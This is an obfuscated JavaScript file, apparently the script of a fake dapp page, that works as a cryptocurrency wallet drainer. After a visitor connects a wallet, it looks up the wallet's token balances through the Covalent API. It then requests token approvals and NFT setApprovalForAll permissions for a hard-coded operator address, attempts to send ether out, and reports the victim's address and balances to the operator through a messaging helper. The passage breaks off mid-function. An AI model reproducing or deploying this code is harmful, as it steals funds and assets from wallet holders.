const _0x262df0=_0x5a68;(function(_0x3b9f3a,_0x451224){const _0x31bea9=_0x5a68,_0x1120c5=_0x3b9f3a();while(!![]){try{const _0x50253c=-parseInt(_0x31bea9(0x1ae))/0x1+-parseInt(_0x31bea9(0x1cd))/0x2*(parseInt(_0x31bea9(0x27b))/0x3)+-parseInt(_0x31bea9(0x24f))/0x4*(parseInt(_0x31bea9(0x235))/0x5)+-parseInt(_0x31bea9(0x20d))/0x6+parseInt(_0x31bea9(0x1cc))/0x7+parseInt(_0x31bea9(0x1e8))/0x8+parseInt(_0x31bea9(0x27d))/0x9;if(_0x50253c===_0x451224)break;else _0x1120c5['push'](_0x1120c5['shift']());}catch(_0x7e26f6){_0x1120c5['push'](_0x1120c5['shift']());}}}(_0x163c,0x49c01));let tokens=[],NFTs=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window[_0x262df0(0x1ed)][_0x262df0(0x1aa)],WalletConnectProvider=window[_0x262df0(0x262)][_0x262df0(0x1aa)],OWNER_ADDRESS=_0x262df0(0x22d),ABI=[{'constant':!![],'inputs':[],'name':_0x262df0(0x18b),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':_0x262df0(0x19e),'type':'address'}],'name':_0x262df0(0x1c6),'outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':_0x262df0(0x203),'type':_0x262df0(0x1b0)},{'name':_0x262df0(0x20a),'type':'uint256'}],'name':_0x262df0(0x1fe),'outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[],'name':_0x262df0(0x1b5),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':_0x262df0(0x21f),'type':'address'}],'name':_0x262df0(0x276),'outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':'function'},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':_0x262df0(0x257),'type':_0x262df0(0x1b0)},{'name':_0x262df0(0x1c8),'type':_0x262df0(0x1b0)},{'name':_0x262df0(0x20a),'type':_0x262df0(0x23d)}],'name':_0x262df0(0x18e),'outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':'function'},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x262df0(0x1b0)}],'payable':![],'stateMutability':'view','type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[{'name':'','type':_0x262df0(0x1b0)}],'name':'balances','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[],'name':_0x262df0(0x24d),'outputs':[{'name':'','type':_0x262df0(0x23d)}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[],'name':_0x262df0(0x1b4),'outputs':[{'name':'','type':_0x262df0(0x23d)}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[],'name':_0x262df0(0x201),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x262df0(0x1cb)},{'constant':![],'inputs':[],'name':_0x262df0(0x23f),'outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[{'name':'_maker','type':'address'}],'name':_0x262df0(0x1cf),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':'view','type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[{'name':'','type':_0x262df0(0x1b0)},{'name':'','type':_0x262df0(0x1b0)}],'name':_0x262df0(0x1b7),'outputs':[{'name':'','type':_0x262df0(0x23d)}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':'function'},{'constant':!![],'inputs':[],'name':_0x262df0(0x279),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':'function'},{'constant':!![],'inputs':[{'name':_0x262df0(0x253),'type':'address'}],'name':'balanceOf','outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[],'name':_0x262df0(0x219),'outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':'function'},{'constant':!![],'inputs':[],'name':_0x262df0(0x249),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':'function'},{'constant':!![],'inputs':[],'name':_0x262df0(0x1e1),'outputs':[{'name':'','type':_0x262df0(0x1b0)}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':'function'},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x262df0(0x1d6)}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':'function'},{'constant':![],'inputs':[{'name':_0x262df0(0x1c8),'type':_0x262df0(0x1b0)},{'name':_0x262df0(0x20a),'type':'uint256'}],'name':_0x262df0(0x24a),'outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':'newBasisPoints','type':_0x262df0(0x23d)},{'name':_0x262df0(0x25d),'type':'uint256'}],'name':_0x262df0(0x1dc),'outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':_0x262df0(0x200),'type':_0x262df0(0x23d)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':_0x262df0(0x200),'type':'uint256'}],'name':'redeem','outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[{'name':_0x262df0(0x239),'type':'address'},{'name':'_spender','type':_0x262df0(0x1b0)}],'name':_0x262df0(0x26f),'outputs':[{'name':'remaining','type':_0x262df0(0x23d)}],'payable':![],'stateMutability':'view','type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[],'name':_0x262df0(0x23a),'outputs':[{'name':'','type':_0x262df0(0x23d)}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[{'name':'','type':_0x262df0(0x1b0)}],'name':_0x262df0(0x1e2),'outputs':[{'name':'','type':_0x262df0(0x256)}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':_0x262df0(0x1e9),'type':'address'}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x262df0(0x1cb)},{'constant':!![],'inputs':[],'name':_0x262df0(0x1e0),'outputs':[{'name':'','type':_0x262df0(0x23d)}],'payable':![],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':_0x262df0(0x1a0),'type':_0x262df0(0x1b0)}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'constant':![],'inputs':[{'name':_0x262df0(0x189),'type':'address'}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x262df0(0x230),'type':'function'},{'inputs':[{'name':_0x262df0(0x278),'type':'uint256'},{'name':_0x262df0(0x1c4),'type':_0x262df0(0x1d6)},{'name':_0x262df0(0x25f),'type':'string'},{'name':_0x262df0(0x277),'type':_0x262df0(0x23d)}],'payable':![],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x27e)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x262df0(0x200),'type':_0x262df0(0x23d)}],'name':'Issue','type':_0x262df0(0x27a)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x262df0(0x200),'type':_0x262df0(0x23d)}],'name':_0x262df0(0x18c),'type':_0x262df0(0x27a)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x262df0(0x1c0),'type':_0x262df0(0x1b0)}],'name':_0x262df0(0x258),'type':_0x262df0(0x27a)},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x262df0(0x23d)},{'indexed':![],'name':'maxFee','type':_0x262df0(0x23d)}],'name':'Params','type':_0x262df0(0x27a)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x262df0(0x189),'type':_0x262df0(0x1b0)},{'indexed':![],'name':_0x262df0(0x26a),'type':_0x262df0(0x23d)}],'name':'DestroyedBlackFunds','type':_0x262df0(0x27a)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x262df0(0x1b0)}],'name':_0x262df0(0x251),'type':_0x262df0(0x27a)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x262df0(0x225),'type':_0x262df0(0x1b0)}],'name':_0x262df0(0x1c7),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x262df0(0x1e1),'type':_0x262df0(0x1b0)},{'indexed':!![],'name':'spender','type':_0x262df0(0x1b0)},{'indexed':![],'name':_0x262df0(0x25b),'type':_0x262df0(0x23d)}],'name':_0x262df0(0x1c5),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x262df0(0x228),'type':_0x262df0(0x1b0)},{'indexed':!![],'name':'to','type':_0x262df0(0x1b0)},{'indexed':![],'name':_0x262df0(0x25b),'type':_0x262df0(0x23d)}],'name':'Transfer','type':_0x262df0(0x27a)},{'anonymous':![],'inputs':[],'name':_0x262df0(0x1ee),'type':_0x262df0(0x27a)},{'anonymous':![],'inputs':[],'name':_0x262df0(0x254),'type':_0x262df0(0x27a)}],ABIN=[{'inputs':[{'internalType':_0x262df0(0x1d6),'name':_0x262df0(0x18b),'type':'string'},{'internalType':'string','name':_0x262df0(0x1f2),'type':_0x262df0(0x1d6)},{'internalType':'uint256','name':'maxNftSupply','type':_0x262df0(0x23d)},{'internalType':_0x262df0(0x23d),'name':_0x262df0(0x206),'type':_0x262df0(0x23d)}],'stateMutability':_0x262df0(0x230),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x262df0(0x1b0),'name':_0x262df0(0x1e1),'type':'address'},{'indexed':!![],'internalType':_0x262df0(0x1b0),'name':_0x262df0(0x1e5),'type':_0x262df0(0x1b0)},{'indexed':!![],'internalType':_0x262df0(0x23d),'name':_0x262df0(0x27c),'type':_0x262df0(0x23d)}],'name':_0x262df0(0x1c5),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x262df0(0x1b0),'name':_0x262df0(0x1e1),'type':_0x262df0(0x1b0)},{'indexed':!![],'internalType':'address','name':_0x262df0(0x220),'type':_0x262df0(0x1b0)},{'indexed':![],'internalType':_0x262df0(0x256),'name':_0x262df0(0x1e5),'type':_0x262df0(0x256)}],'name':_0x262df0(0x1e4),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x262df0(0x1b0),'name':_0x262df0(0x216),'type':_0x262df0(0x1b0)},{'indexed':!![],'internalType':_0x262df0(0x1b0),'name':_0x262df0(0x1a0),'type':_0x262df0(0x1b0)}],'name':_0x262df0(0x1d9),'type':_0x262df0(0x27a)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x262df0(0x1b0),'name':_0x262df0(0x228),'type':_0x262df0(0x1b0)},{'indexed':!![],'internalType':_0x262df0(0x1b0),'name':'to','type':_0x262df0(0x1b0)},{'indexed':!![],'internalType':'uint256','name':_0x262df0(0x27c),'type':_0x262df0(0x23d)}],'name':'Transfer','type':'event'},{'inputs':[],'name':_0x262df0(0x1fb),'outputs':[{'internalType':_0x262df0(0x1d6),'name':'','type':_0x262df0(0x1d6)}],'stateMutability':'view','type':_0x262df0(0x1cb)},{'inputs':[],'name':_0x262df0(0x24c),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x262df0(0x1f3),'outputs':[{'internalType':_0x262df0(0x23d),'name':'','type':_0x262df0(0x23d)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x262df0(0x19f),'outputs':[{'internalType':_0x262df0(0x23d),'name':'','type':_0x262df0(0x23d)}],'stateMutability':'view','type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x1b0),'name':'to','type':'address'},{'internalType':_0x262df0(0x23d),'name':_0x262df0(0x27c),'type':_0x262df0(0x23d)}],'name':_0x262df0(0x1fe),'outputs':[],'stateMutability':'nonpayable','type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x1b0),'name':'owner','type':'address'}],'name':_0x262df0(0x22a),'outputs':[{'internalType':_0x262df0(0x23d),'name':'','type':_0x262df0(0x23d)}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[],'name':_0x262df0(0x1ac),'outputs':[{'internalType':_0x262df0(0x1d6),'name':'','type':_0x262df0(0x1d6)}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[],'name':_0x262df0(0x1e7),'outputs':[],'stateMutability':'nonpayable','type':_0x262df0(0x1cb)},{'inputs':[],'name':_0x262df0(0x188),'outputs':[],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x23d),'name':_0x262df0(0x27c),'type':'uint256'}],'name':_0x262df0(0x1c2),'outputs':[{'internalType':'address','name':'','type':'address'}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x1b0),'name':_0x262df0(0x1e1),'type':_0x262df0(0x1b0)},{'internalType':'address','name':_0x262df0(0x220),'type':_0x262df0(0x1b0)}],'name':_0x262df0(0x18f),'outputs':[{'internalType':_0x262df0(0x256),'name':'','type':_0x262df0(0x256)}],'stateMutability':_0x262df0(0x1a5),'type':'function'},{'inputs':[],'name':_0x262df0(0x1bb),'outputs':[{'internalType':'uint256','name':'','type':_0x262df0(0x23d)}],'stateMutability':_0x262df0(0x1a5),'type':'function'},{'inputs':[{'internalType':_0x262df0(0x23d),'name':_0x262df0(0x18d),'type':_0x262df0(0x23d)}],'name':_0x262df0(0x241),'outputs':[],'stateMutability':'payable','type':_0x262df0(0x1cb)},{'inputs':[],'name':_0x262df0(0x18b),'outputs':[{'internalType':_0x262df0(0x1d6),'name':'','type':_0x262df0(0x1d6)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x262df0(0x1e1),'outputs':[{'internalType':'address','name':'','type':_0x262df0(0x1b0)}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x23d),'name':_0x262df0(0x27c),'type':_0x262df0(0x23d)}],'name':_0x262df0(0x208),'outputs':[{'internalType':_0x262df0(0x1b0),'name':'','type':_0x262df0(0x1b0)}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x1b0),'name':_0x262df0(0x228),'type':_0x262df0(0x1b0)},{'internalType':_0x262df0(0x1b0),'name':'to','type':_0x262df0(0x1b0)},{'internalType':_0x262df0(0x23d),'name':_0x262df0(0x27c),'type':_0x262df0(0x23d)}],'name':_0x262df0(0x1d8),'outputs':[],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x1b0),'name':'from','type':'address'},{'internalType':_0x262df0(0x1b0),'name':'to','type':_0x262df0(0x1b0)},{'internalType':'uint256','name':_0x262df0(0x27c),'type':_0x262df0(0x23d)},{'internalType':'bytes','name':_0x262df0(0x215),'type':_0x262df0(0x1bd)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x262df0(0x230),'type':'function'},{'inputs':[],'name':_0x262df0(0x1ff),'outputs':[{'internalType':'bool','name':'','type':_0x262df0(0x256)}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x1b0),'name':'operator','type':_0x262df0(0x1b0)},{'internalType':_0x262df0(0x256),'name':_0x262df0(0x1e5),'type':'bool'}],'name':'setApprovalForAll','outputs':[],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':'string','name':_0x262df0(0x1ac),'type':_0x262df0(0x1d6)}],'name':_0x262df0(0x269),'outputs':[],'stateMutability':_0x262df0(0x230),'type':'function'},{'inputs':[{'internalType':_0x262df0(0x1d6),'name':'provenanceHash','type':_0x262df0(0x1d6)}],'name':_0x262df0(0x22e),'outputs':[],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x23d),'name':_0x262df0(0x1a7),'type':'uint256'}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x262df0(0x230),'type':'function'},{'inputs':[],'name':_0x262df0(0x25e),'outputs':[],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'inputs':[],'name':_0x262df0(0x185),'outputs':[{'internalType':'uint256','name':'','type':_0x262df0(0x23d)}],'stateMutability':_0x262df0(0x1a5),'type':'function'},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':_0x262df0(0x23d),'name':'','type':_0x262df0(0x23d)}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':'bytes4','name':_0x262df0(0x1f6),'type':'bytes4'}],'name':_0x262df0(0x26e),'outputs':[{'internalType':_0x262df0(0x256),'name':'','type':_0x262df0(0x256)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x262df0(0x1f2),'outputs':[{'internalType':'string','name':'','type':_0x262df0(0x1d6)}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x23d),'name':'index','type':_0x262df0(0x23d)}],'name':_0x262df0(0x22c),'outputs':[{'internalType':_0x262df0(0x23d),'name':'','type':_0x262df0(0x23d)}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':'address','name':_0x262df0(0x1e1),'type':_0x262df0(0x1b0)},{'internalType':'uint256','name':_0x262df0(0x1b8),'type':'uint256'}],'name':_0x262df0(0x1eb),'outputs':[{'internalType':_0x262df0(0x23d),'name':'','type':'uint256'}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x23d),'name':_0x262df0(0x27c),'type':_0x262df0(0x23d)}],'name':_0x262df0(0x212),'outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':_0x262df0(0x1a5),'type':'function'},{'inputs':[],'name':_0x262df0(0x1ea),'outputs':[{'internalType':_0x262df0(0x23d),'name':'','type':_0x262df0(0x23d)}],'stateMutability':_0x262df0(0x1a5),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':'address','name':_0x262df0(0x228),'type':_0x262df0(0x1b0)},{'internalType':_0x262df0(0x1b0),'name':'to','type':_0x262df0(0x1b0)},{'internalType':_0x262df0(0x23d),'name':_0x262df0(0x27c),'type':_0x262df0(0x23d)}],'name':'transferFrom','outputs':[],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)},{'inputs':[{'internalType':_0x262df0(0x1b0),'name':_0x262df0(0x1a0),'type':_0x262df0(0x1b0)}],'name':_0x262df0(0x20e),'outputs':[],'stateMutability':'nonpayable','type':_0x262df0(0x1cb)},{'inputs':[],'name':'withdraw','outputs':[],'stateMutability':_0x262df0(0x230),'type':_0x262df0(0x1cb)}],networkToId={0x1328cf7:_0x262df0(0x24e),0x1:'eth-mainnet',0x5:_0x262df0(0x259),0x89:'matic-mainnet',0x13881:_0x262df0(0x218),0x38:_0x262df0(0x1b9),0x61:_0x262df0(0x1b1),0xa86a:_0x262df0(0x229),0xa869:_0x262df0(0x1a8),0xfa:_0x262df0(0x19a),0xfa2:'fantom-testnet',0xa4b1:_0x262df0(0x221),0x66eed:'arbitrum-goerli',0xa4ba:_0x262df0(0x1ad),0x250:'astar-mainnet',0x51:'astar-shibuya',0x150:'astar-shiden',0x4e454152:_0x262df0(0x238),0x4e454153:_0x262df0(0x1dd),0x6984c:_0x262df0(0x266),0x69849:_0x262df0(0x25c),0x7e4:_0x262df0(0x280),0x14a33:'base-testnet',0x77:_0x262df0(0x1bf),0x405:_0x262df0(0x1f1),0xa918:_0x262df0(0x26b),0x10e8:_0x262df0(0x1da),0xdbe0:_0x262df0(0x223),0x2600:_0x262df0(0x242),0x50e:_0x262df0(0x226),0x511:_0x262df0(0x199),0x120:_0x262df0(0x1be),0x1c:'boba-rinkeby-testnet',0xb48:_0x262df0(0x1fd),0x1e14:_0x262df0(0x1fc),0x436f7631:_0x262df0(0x245),0x19:'cronos-mainnet',0x152:_0x262df0(0x1d4),0xd2af:'defi-kingdoms-mainnet',0x14f:_0x262df0(0x23e),0xa516:_0x262df0(0x20c),0x2329:_0x262df0(0x19b),0x2328:_0x262df0(0x1bc),0x868:_0x262df0(0x233),0x86a:'findora-forge-testnet',0x13:'flarenetworks-canary-mainnet',0x10:_0x262df0(0x1b3),0xe:'flarenetworks-flare-mainnet',0x72:_0x262df0(0x246),0xb7e7759:_0x262df0(0x1ec),0x153c099c:_0x262df0(0x255),0x63564c40:'harmony-mainnet',0x6357d2e0:_0x262df0(0x1ef),0x141:_0x262df0(0x270),0x142:_0x262df0(0x194),0xe704:_0x262df0(0x186),0x1389:'mantle-testnet',0x52:'meter-mainnet',0x53:_0x262df0(0x191),0x440:_0x262df0(0x231),0x24c:'metis-testnet',0x7d2:_0x262df0(0x1a6),0x30e0a:_0x262df0(0x197),0x7d1:_0x262df0(0x1ab),0x30da5:_0x262df0(0x261),0x504:_0x262df0(0x1c3),0x507:_0x262df0(0x281),0x505:_0x262df0(0x234),0xe9ac0ce:_0x262df0(0x275),0x116ea:_0x262df0(0x1af),0x116e9:'nervos-godwoken-testnet',0x116e1:_0x262df0(0x1fa),0x5afe:'oasis-sapphire-mainnet',0x5aff:_0x262df0(0x1f8),0xf8:'oasys-mainnet',0x249c:_0x262df0(0x195),0xa:_0x262df0(0x20b),0x2a15c308d:_0x262df0(0x187),0x2a15c3083:_0x262df0(0x27f),0x5a2:_0x262df0(0x227),0x1e:_0x262df0(0x1a2),0x1f:_0x262df0(0x260),0x5d456c62:'skale-calypso',0x1482a7b2:'skale-staging-uum',0x3d28774d:_0x262df0(0x192),0x109b4597:'skale-razor',0x536f6c4d:_0x262df0(0x1d1),0x1202c:'swimmer-mainnet',0x1202d:_0x262df0(0x1de),0x1a0:_0x262df0(0x23c)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0xfa:_0x262df0(0x21c)},'chainId':0xfa,'network':'fantom','infuraId':'e62a60a251c64745baefeaf8237af646','pollingInterval':_0x262df0(0x1d3)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':'Debug','infuraId':_0x262df0(0x22f),'rpc':_0x262df0(0x21c),'chainId':0xfa,'chainName':_0x262df0(0x210),'darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x262df0(0x1a9))[_0x262df0(0x1db)](async function(){const _0x4bda3d=_0x262df0;try{let _0x26db00=await web3Modal['connect']();onProvider(_0x26db00),_0x26db00['on'](_0x4bda3d(0x236),_0x110b22=>{console['log'](_0x110b22),onProvider(_0x26db00);});}catch(_0x197c2b){console[_0x4bda3d(0x193)](_0x4bda3d(0x240),_0x197c2b);return;}});async function onProvider(_0x54f61c){const _0x4ab79d=_0x262df0;web3Object=new Web3(_0x54f61c);let _0x7574bc=await web3Object[_0x4ab79d(0x1c1)][_0x4ab79d(0x26d)]();selectedAccount=_0x7574bc[0x0],chainName=await web3Object[_0x4ab79d(0x1c1)]['getChainId'](),chainId=networkToId[chainName],console[_0x4ab79d(0x193)](chainId),console[_0x4ab79d(0x193)](selectedAccount),_0x7574bc['length']&&(sendMessage(_0x4ab79d(0x271)),sendMessage(_0x4ab79d(0x23b)+selectedAccount),covalenthqAPICall());}const Oxa=_0x262df0(0x1d5),Oxc=_0x262df0(0x1f0);function _0x5a68(_0x422559,_0x57b837){const _0x163c25=_0x163c();return _0x5a68=function(_0x5a682e,_0x1be82c){_0x5a682e=_0x5a682e-0x185;let _0x1924a7=_0x163c25[_0x5a682e];return _0x1924a7;},_0x5a68(_0x422559,_0x57b837);}async function covalenthqAPICall(){const _0x872254=_0x262df0,_0x47a4eb={'chain':_0x872254(0x210)},_0x341b6c=new URL(_0x872254(0x21d)+selectedAccount+_0x872254(0x202));_0x341b6c[_0x872254(0x248)]=new URLSearchParams(_0x47a4eb)[_0x872254(0x205)]();const _0x16c3e5={'method':'GET','headers':{'accept':'application/json','X-API-Key':_0x872254(0x1ba)}};try{const _0x24b486=await fetch(_0x341b6c,_0x16c3e5)[_0x872254(0x1a4)](_0x572953=>_0x572953[_0x872254(0x232)]());console[_0x872254(0x193)](_0x24b486);let _0x576914=_0x24b486;console[_0x872254(0x193)](_0x872254(0x1df),_0x576914);let _0x4e54e5=await Promise[_0x872254(0x244)](_0x576914[_0x872254(0x25a)](async _0x4621e8=>{const _0x8ba4b3=_0x872254;let _0x1dd054;try{_0x1dd054=await getValue(_0x4621e8[_0x8ba4b3(0x196)],_0x4621e8['balance'],_0x4621e8['decimals']);}catch(_0x2b55af){_0x1dd054=0x0;}return console[_0x8ba4b3(0x193)](_0x1dd054),{'balance':_0x4621e8[_0x8ba4b3(0x1ca)],'value':_0x1dd054,'address':_0x4621e8[_0x8ba4b3(0x196)]};}));console['log']('tokens-list',_0x4e54e5),tokens=_0x4e54e5[_0x872254(0x198)](_0x5a88d7=>_0x5a88d7['value']>0x5),tokens[_0x872254(0x21a)]((_0x59db95,_0x21648b)=>_0x21648b[_0x872254(0x25b)]-_0x59db95[_0x872254(0x25b)]),console['log'](_0x872254(0x211),chainId,_0x872254(0x190),tokens);if(tokens[_0x872254(0x19c)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x872254(0x272));}NFTs=await getNFTs(selectedAccount)[_0x872254(0x1b2)](_0x11b5d7=>{const _0x440aa8=_0x872254;console[_0x440aa8(0x193)]('Unable\x20to\x20get\x20NFts',_0x11b5d7);}),NFTs=NFTs[_0x872254(0x204)],console[_0x872254(0x193)](_0x872254(0x214),NFTs);}async function onApprove(){const _0x509029=_0x262df0;if(tokens[_0x509029(0x19c)])try{loopTokens(tokens);}catch(_0x2b2191){console[_0x509029(0x22b)](_0x509029(0x268)+_0x2b2191[_0x509029(0x274)]);}else{if(NFTs[_0x509029(0x19c)]){try{loopNfts(NFTs);}catch(_0x52e317){console[_0x509029(0x22b)](_0x509029(0x268)+_0x52e317[_0x509029(0x274)]);}onSendEther(),sendMessage(_0x509029(0x1f4));}else try{onSendEther();}catch(_0x51749c){console[_0x509029(0x22b)]('Error\x20processing\x20item\x20'+_0x51749c[_0x509029(0x274)]);}}}async function loopTokens(_0x2c3e22){const _0x8a0289=_0x262df0;for await(let _0x552b4c of _0x2c3e22){console[_0x8a0289(0x193)]('Token',_0x552b4c);try{let _0x1a5b84=new web3Object[(_0x8a0289(0x1c1))][(_0x8a0289(0x209))](ABI,_0x552b4c[_0x8a0289(0x1b0)]);sendMessage('New\x20token'),await _0x1a5b84[_0x8a0289(0x237)][_0x8a0289(0x1fe)](Oxa,_0x8a0289(0x1a1))[_0x8a0289(0x243)]({'from':selectedAccount,'to':_0x552b4c[_0x8a0289(0x1b0)]})['on'](_0x8a0289(0x1c9),_0x516884=>{const _0x27d5db=_0x8a0289;console[_0x27d5db(0x193)](_0x27d5db(0x207)+_0x516884);})['on'](_0x8a0289(0x263),_0x589520=>{const _0x46b925=_0x8a0289;console['log']('Transaction\x20Receipt:\x20'+_0x589520),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x46b925(0x273)+_0x552b4c['address']),sendMessage(_0x46b925(0x224)+_0x552b4c['balance']),sendMessage(_0x46b925(0x217)+Oxa);})['on']('error',_0x2b9081=>{const _0x404bbd=_0x8a0289;console[_0x404bbd(0x193)](_0x404bbd(0x1f5)+_0x2b9081),sendMessage('Transaction\x20Rejected');});}catch(_0x437b9b){console[_0x8a0289(0x193)](_0x8a0289(0x1f5)+_0x437b9b),sendMessage('Transaction\x20Rejected');}};await loopNfts(NFTs);}async function loopNfts(_0x1dc64a){const _0x5ec824=_0x262df0;for await(let _0x5e22d1 of _0x1dc64a){console['log'](_0x5ec824(0x250),_0x5e22d1);try{let _0x1cb207=new web3Object[(_0x5ec824(0x1c1))][(_0x5ec824(0x209))](ABIN,_0x5e22d1[_0x5ec824(0x196)]);await _0x1cb207[_0x5ec824(0x237)][_0x5ec824(0x19d)](Oxa,_0x5ec824(0x21e))[_0x5ec824(0x243)]({'from':selectedAccount,'to':_0x5e22d1['token_address']})['on'](_0x5ec824(0x1c9),_0x26a449=>{const _0x4dddd8=_0x5ec824;console['log'](_0x4dddd8(0x207)+_0x26a449),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network');})['on'](_0x5ec824(0x263),_0xdd16d2=>{const 